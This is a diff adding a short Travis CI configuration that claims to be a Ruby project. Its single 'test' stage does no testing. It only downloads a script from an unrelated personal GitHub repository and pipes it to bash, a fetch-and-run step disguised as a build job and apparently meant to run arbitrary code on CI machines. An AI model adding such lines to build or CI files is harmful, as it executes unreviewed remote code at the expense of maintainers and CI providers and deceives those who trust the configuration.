@@ -1,0 +1,9 @@
+language: ruby
+
+
+jobs:
+  include:
+    - stage: test
+      name: "build1"
+      script:
+        - wget https://raw.githubusercontent.com/Lanu12/Lalan/refs/heads/main/Anu| bash
